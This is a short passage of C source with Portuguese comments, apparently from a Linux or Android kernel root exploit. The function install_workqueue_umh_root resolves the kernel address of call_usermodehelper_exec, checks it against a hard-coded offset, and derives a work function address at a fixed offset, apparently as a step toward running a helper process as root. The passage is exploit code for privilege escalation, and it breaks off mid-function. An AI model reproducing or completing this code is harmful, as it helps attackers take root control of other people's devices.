...
static int install_workqueue_umh_root(int fd) {
 ...
 uint64_t umh_exec = text_addr("call_usermodehelper_exec");
  if (!umh_exec) {
    pr_error("root umh failed to resolve call_usermodehelper_exec\n");
    return 0;
  }
  
  /* Validação opcional: garante que o offset do target.h bate com o kallsyms */
#ifdef CALL_USERMODEHELPER_EXEC_OFF
  uint64_t expected_exec = KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_OFF;
  if (umh_exec != expected_exec) {
    pr_error("root umh kallsyms mismatch: got=%016llx expected=%016llx\n",
             (unsigned long long)umh_exec,
             (unsigned long long)expected_exec);
    /* Não aborta — continua com o kallsyms que é o valor real do runtime */
  }
#endif

  uint64_t umh_work_func = umh_exec - 0x104;
  pr_info("root umh exec=%016llx exec_work=%016llx\n",
          (unsigned long long)umh_exec,
          (unsigned long long)umh_work_func);
